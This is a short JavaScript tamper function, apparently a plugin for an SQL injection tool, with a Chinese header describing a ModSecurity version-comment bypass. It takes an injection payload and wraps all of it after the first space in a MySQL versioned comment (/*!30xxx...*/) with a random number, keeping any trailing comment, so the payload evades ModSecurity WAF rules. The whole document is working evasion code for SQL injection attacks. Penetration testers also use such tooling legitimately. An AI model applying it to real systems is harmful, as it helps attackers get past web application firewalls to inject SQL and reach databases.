//@name: ModSecurity版本注释
//@usage: payload
//@enable: false
//@description: 首空格后整段包裹/*!30xxx..*/版本注释（注释尾保留，MySQL/ModSecurity）
function tamper(payload){
    if (!payload) { return payload; }
    var postfix = '';
    var cuts = ['#', '--', '/*'];
    for (var k = 0; k < cuts.length; k++){
        var idx = payload.indexOf(cuts[k]);
        if (idx >= 0){ postfix = payload.substring(idx); payload = payload.substring(0, idx); break; }
    }
    var sp = payload.indexOf(' ');
    if (sp < 0) { return payload; }
    var rnd = String(Math.floor(Math.random() * 1000)).padStart(3, '0');
    return payload.substring(0, sp) + ' /*!30' + rnd + payload.substring(sp + 1) + '*/' + postfix;
}